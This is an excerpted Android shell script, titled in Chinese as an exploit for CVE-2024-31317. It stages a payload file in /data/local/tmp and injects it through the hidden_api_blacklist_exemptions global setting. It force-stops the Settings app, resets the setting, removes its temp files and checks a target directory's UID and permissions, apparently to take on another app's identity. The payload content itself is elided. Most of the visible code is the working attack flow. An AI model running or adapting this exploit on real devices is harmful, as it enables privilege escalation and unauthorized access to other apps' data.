...
# CVE-2024-31317漏洞利用脚本 - Shell终端版本
...
# 获取目录信息并提取UID
dir_info=$(ls -lnd "$target_dir" 2>/dev/null)
if [ $? -ne 0 ]; then
...
# 将payload写入临时文件
temp_file="/data/local/tmp/payload_$$.txt"
echo "$payload_content" > "$temp_file"

# 验证payload文件是否成功创建
if [ ! -f "$temp_file" ]; then
    echo "❌ 无法创建payload文件: $temp_file"
    exit 1
fi
...
echo "[+] payload文件已创建，大小: $file_size 字节"
echo "[+] payload文件路径: $temp_file"

# 将payload文件复制到标准位置
cp "$temp_file" /data/local/tmp/payload.txt
if [ $? -ne 0 ]; then
    echo "❌ 无法复制payload文件到标准位置"
    rm -f "$temp_file"
    exit 1
fi

# 验证标准位置的payload文件
if [ ! -f "/data/local/tmp/payload.txt" ]; then
    echo "❌ 标准位置的payload文件不存在"
    rm -f "$temp_file"
    exit 1
fi
...
# 验证payload文件是否可读
if [ ! -r "/data/local/tmp/payload.txt" ]; then
    echo "❌ payload文件不可读"
    rm -f "$temp_file" "/data/local/tmp/payload.txt"
    exit 1
fi

# 设置hidden_api_blacklist_exemptions
cd /data/local/tmp
settings put global hidden_api_blacklist_exemptions "$(cat payload.txt)" >/dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "❌ 设置hidden_api_blacklist_exemptions失败"
    rm -f "$temp_file" "/data/local/tmp/payload.txt"
    exit 1
fi

echo "[+] hidden_api_blacklist_exemptions已设置"
...
# 清理：将豁免设置重置为null
settings put global hidden_api_blacklist_exemptions null >/dev/null 2>&1

# 再次停止设置应用
am force-stop com.android.settings >/dev/null 2>&1

# 清理临时文件
rm -f "$temp_file" "/data/local/tmp/payload.txt" 2>/dev/null
...
# 获取当前权限并转换为数字格式
current_perms=$(ls -ld "$target_dir" 2>/dev/null | awk '{print $1}')
if [ -z "$current_perms" ]; then
    echo "❌ 无法访问目标目录，可能目录不存在或权限不足"
    exit 1
fi
